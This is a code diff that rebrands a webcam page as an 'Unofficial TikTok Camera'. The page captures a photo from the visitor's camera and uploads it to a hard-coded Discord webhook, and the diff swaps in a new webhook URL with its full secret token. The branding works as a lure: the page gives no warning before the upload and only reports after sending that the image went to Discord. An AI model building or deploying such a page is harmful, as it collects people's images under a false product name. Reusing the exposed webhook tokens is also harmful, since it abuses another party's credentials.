@@ -3,22 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webcam Capture</title>
+    <title>TikTok-Inspired Camera</title>
     <style>
-        video {
-            opacity: 0.7;
-            width: 100%;
-            max-width: 400px;
-            border: 2px solid black;
+        body {
+            margin: 0;
+            background: linear-gradient(to bottom, #000, #111);
+            font-family: 'Poppins', sans-serif;
+            color: white;
+            text-align: center;
+            overflow: hidden;
         }
-        canvas {
+        h1 {
+            font-size: 2rem;
+            color: #fff;
+            margin-top: 20px;
+            text-shadow: 0 0 5px #f0f, 0 0 10px #0ff;
+        }
+        video {
+            margin-top: 20px;
+            width: 90%;
+            max-width: 400px;
+            border: 10px solid;
+            border-image: linear-gradient(to right, #f0f, #0ff, #f0f) 1;
+            border-radius: 20px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 1rem;
+            border: none;
+            border-radius: 25px;
+            background: linear-gradient(to right, #f0f, #0ff);
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
+        }
+        button:active {
+            transform: scale(0.95);
+        }
+        #loadingIndicator {
             display: none;
+            margin: 20px auto;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <h1>Webcam Capture</h1>
+    <h1>Unofficial TikTok Camera</h1>
     <video id="webcam" autoplay></video>
+    <div id="loadingIndicator"></div>
     <button id="captureButton">Capture</button>
     <p id="message"></p>
     <canvas id="canvas"></canvas>
@@ -28,10 +76,11 @@
         const captureButton = document.getElementById('captureButton');
         const message = document.getElementById('message');
         const canvas = document.getElementById('canvas');
+        const loadingIndicator = document.getElementById('loadingIndicator');
         const ctx = canvas.getContext('2d');
 
         // Your Discord webhook URL
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328824264056508557/zDyChSBsuQ3h4LgLCCFHYYqlLvAhxDL2oyoGPRBS2MhCI_MS83EifbINebIE9D0Tz_Sq";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328823824275214336/zvW9MAN890FiTSeo53UINP2aHDjjBRxzXSHYzbggJiSfQdOS94XjH8Ex-aEfaUQy9TJ8";
 
         // Access the webcam
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -44,22 +93,21 @@
 
         // Capture image and send to Discord webhook
         captureButton.addEventListener('click', () => {
-            // Set canvas size to match the video
+            loadingIndicator.style.display = 'block';
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convert the captured image to a Blob
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('file', blob, 'webcam-image.png');
 
-                // Send the image to the Discord webhook
                 fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     body: formData,
                 })
                     .then(response => {
+                        loadingIndicator.style.display = 'none';
                         if (response.ok) {
                             message.textContent = 'Image successfully sent to Discord!';
                         } else {
@@ -67,6 +115,7 @@
                         }
                     })
                     .catch(error => {
+                        loadingIndicator.style.display = 'none';
                         message.textContent = 'Error sending image: ' + error.message;
                     });
             }, 'image/png');
